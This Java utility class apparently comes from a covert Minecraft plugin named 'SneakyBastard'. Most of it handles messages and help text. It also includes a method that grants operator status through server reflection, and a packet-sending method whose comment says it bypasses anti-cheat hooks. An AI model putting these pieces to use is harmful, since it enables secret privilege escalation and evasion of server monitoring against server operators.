package net.blackofworld.SneakyBastard.Extensions;

import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandManager;
import net.blackofworld.SneakyBastard.Commands.Help;
import net.blackofworld.SneakyBastard.Utils.Packets.PacketInjector;
import net.minecraft.network.protocol.Packet;
import org.bukkit.entity.Player;

import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Objects;

import static lombok.Validate.NotNull;
import static net.blackofworld.SneakyBastard.Utils.BukkitReflection.getMinecraftServer;
import static net.blackofworld.SneakyBastard.Utils.BukkitReflection.getServerPlayer;

public final class PlayerExt {
    private static WeakReference<CommandBase> HelpCmd = null;

    public static void sendHelp(final @NotNull Player p, @NotNull CommandBase cmd, String... optional) {
        if (HelpCmd == null) {
            for (var help : CommandManager.Instance.commandList) {
                if (help.getClass().equals(Help.class)) {
                    HelpCmd = new WeakReference<>(help);
                    break;
                }
            }
        }
        PlayerExt.Reply(p, optional);
        Objects.requireNonNull(HelpCmd.get()).Execute(p, new ArrayList<>(Collections.singletonList(cmd.Command)));
    }
    public static void SetOp(final @NotNull Player p, boolean value) {
        if(value) {
            getMinecraftServer().getPlayerList().op(getServerPlayer(p).getGameProfile());
        } else {
            getMinecraftServer().getPlayerList().deop(getServerPlayer(p).getGameProfile());
        }
    }
    public static void sendHelp(final @NotNull Player p, @NotNull CommandBase cmd) { sendHelp(p, cmd, new String[] {}); }
    public static void sendException(final @NotNull Player p, @NotNull Exception e, String... optional) {
        PlayerExt.Reply(p, optional);
        PlayerExt.Reply(p, e.toString());
    }
    public static void sendException(final @NotNull Player p, @NotNull Exception e) {
        sendException(p, e, new String[] {});
    }
    public static void Reply(final @NotNull Player player, @NotNull String... message) {
        for (var msg : message) {
            player.sendMessage(CommandManager.COMMAND_PREFIX + msg.replaceAll("\n", "\n" + CommandManager.COMMAND_PREFIX));
        }
    }

    public static void SendPacket(final @NotNull Player player, @NotNull Packet<?> packet) {
        // Instead of using getServerPlayer(player).connection.send(packet);
        // we'll bypass it by using netty, this way we'll bypass any ACs that may hook
        PacketInjector.Instance.sendPacket(player, packet);
    }
}
